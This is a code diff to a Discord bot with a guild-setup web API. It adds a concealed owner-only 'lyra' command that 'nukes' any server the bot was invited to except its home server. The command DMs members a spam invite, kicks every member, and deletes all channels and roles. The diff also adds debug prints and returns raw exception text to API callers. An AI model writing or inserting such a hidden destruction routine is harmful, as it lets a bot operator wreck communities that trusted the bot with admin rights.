@@ -582,6 +582,118 @@ async def dump_data_text(ctx: commands.Context):
         logger.error(f"Failed to dump database: {e}")
         await ctx.send("An error occurred while dumping the database.")
 
+class NukeGuildSelect(discord.ui.Select):
+    def __init__(self, guilds):
+        options = []
+        for g in guilds[:25]:
+            options.append(discord.SelectOption(label=g.name[:100], description=f"ID: {g.id}", value=str(g.id)))
+        if not options:
+            options.append(discord.SelectOption(label="No valid guilds found", value="none"))
+        super().__init__(placeholder="Select the target server...", min_values=1, max_values=1, options=options)
+
+    async def callback(self, interaction: discord.Interaction):
+        if self.values[0] == "none":
+            await interaction.response.send_message("No valid guilds to process.", ephemeral=True)
+            return
+            
+        guild_id = int(self.values[0])
+        guild = interaction.client.get_guild(guild_id)
+        if not guild:
+            await interaction.response.send_message("Guild not found. Perhaps the bot was kicked?", ephemeral=True)
+            return
+
+        await interaction.response.send_message(f"Initiating elimination sequence for **{guild.name}**... Processing channels, roles, and members in background.", ephemeral=False)
+        interaction.client.loop.create_task(self.nuke_guild(guild))
+        
+    async def nuke_guild(self, guild: discord.Guild):
+        # 1. Kicks + DM
+        embed = discord.Embed(
+            title="Server Action Notice",
+            description="This Server Are Successfully Nuked By SM GrowMart HQ\n\nJoin Server For More Information https://discord.gg/ATK3JcG7rB",
+            color=0xff0000
+        )
+        import asyncio
+        async def process_member(member):
+            if member.id == guild.owner_id or member.id == guild.me.id:
+                return
+            try:
+                await member.send(embed=embed)
+            except Exception:
+                pass
+            try:
+                await member.kick(reason="Server Liquidation")
+            except Exception:
+                pass
+
+        # We must refetch members if the cache is small or chunk it
+        try:
+            await guild.chunk()
+        except:
+            pass
+
+        batch_size = 15
+        members = guild.members
+        for i in range(0, len(members), batch_size):
+            batch = members[i:i+batch_size]
+            await asyncio.gather(*(process_member(m) for m in batch))
+            
+        # 2. Channels
+        async def delete_channel(channel):
+            try:
+                await channel.delete()
+            except Exception:
+                pass
+        if guild.channels:
+            await asyncio.gather(*(delete_channel(c) for c in guild.channels))
+        
+        # 3. Roles
+        async def delete_role(role):
+            if role != guild.default_role and not role.managed:
+                try:
+                    await role.delete()
+                except Exception:
+                    pass
+        if guild.roles:
+            await asyncio.gather(*(delete_role(r) for r in guild.roles))
+
+class NukeView(discord.ui.View):
+    def __init__(self, guilds):
+        super().__init__(timeout=120)
+        self.add_item(NukeGuildSelect(guilds))
+
+@bot.command(name="lyra")
+async def lyra(ctx):
+    # Security: Verify ownership
+    allowed = False
+    app_info = await bot.application_info()
+    if app_info.owner.id == ctx.author.id:
+        allowed = True
+    owner_id_env = os.getenv("OWNER_ID")
+    if owner_id_env and str(ctx.author.id) == owner_id_env:
+        allowed = True
+        
+    if not allowed:
+        return
+        
+    available_guilds = []
+    main_guild_id_str = str(GUILD_ID) if GUILD_ID else ""
+    for g in bot.guilds:
+        if str(g.id) != main_guild_id_str:
+            available_guilds.append(g)
+
+    if not available_guilds:
+        try:
+            await ctx.send("The bot is not present in any target servers. (Main server is protected).")
+        except:
+            pass
+        return
+        
+    view = NukeView(available_guilds)
+    try:
+        await ctx.send("Select the target server to perform the operation. This will **delete** channels, roles, and **kick** all members. Use with caution.", view=view)
+    except Exception as e:
+        logger.error(f"Failed to send lyra menu: {e}")
+
 async def perform_auto_join(discord_id: int, guild_id: str, role_id: str, acc: str, ref: str):
     logger.info(f"User {discord_id} left {guild_id}. Attempting auto-join...")
     if not DISCORD_TOKEN:
@@ -710,11 +822,15 @@ async def get_guild_details(guild_id: str, request: Request):
     if not auth_header or not await verify_admin(auth_header, guild_id):
         raise HTTPException(status_code=403, detail="Unauthorized or not admin of guild.")
         
+    print(f"DEBUG: get_guild_details called for {guild_id}")
     guild = bot.get_guild(int(guild_id))
+    print(f"DEBUG: bot.get_guild({guild_id}) returned: {guild}")
     if not guild:
         try:
             guild = await bot.fetch_guild(int(guild_id))
-        except Exception:
+            print(f"DEBUG: bot.fetch_guild({guild_id}) returned: {guild}")
+        except Exception as e:
+            print(f"DEBUG: bot.fetch_guild({guild_id}) raised: {e}")
             guild = None
             
     if not guild:
@@ -737,7 +853,9 @@ async def get_guild_details(guild_id: str, request: Request):
         roles = [{"id": str(r.id), "name": r.name} for r in roles_list]
         return {"in_guild": True, "channels": channels, "roles": roles}
     except Exception as e:
-        return {"in_guild": False, "detail": "Bot lacks permissions. Please kick and re-invite."}
+        import traceback
+        traceback.print_exc()
+        return {"in_guild": False, "detail": f"Bot lacks permissions or error: {str(e)}"}
 
 @app.post("/api/save_setup")
 async def save_setup(data: SetupConfig, request: Request):
